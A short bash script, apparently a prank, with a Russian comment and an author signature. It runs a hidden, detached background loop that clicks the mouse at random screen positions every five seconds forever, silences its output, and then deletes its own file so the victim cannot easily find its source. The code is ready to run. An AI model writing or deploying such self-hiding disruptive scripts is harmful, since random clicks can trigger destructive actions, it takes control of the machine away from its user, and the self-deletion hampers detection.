# #!/bin/bash
# Случайные позиции кликов мыши на экране 🥰💀 P.S. С любовью, Bauka (basagitz)

nohup bash -c "
SCREEN_WIDTH=\$(xdotool getdisplaygeometry | awk '{print \$1}')
SCREEN_HEIGHT=\$(xdotool getdisplaygeometry | awk '{print \$2}')

while true; do
    RANDOM_X=\$(( RANDOM % SCREEN_WIDTH ))
    RANDOM_Y=\$(( RANDOM % SCREEN_HEIGHT ))
    
    xdotool mousemove \$RANDOM_X \$RANDOM_Y click 1
    sleep 5
done
" > /dev/null 2>&1 & disown
rm -- "$0"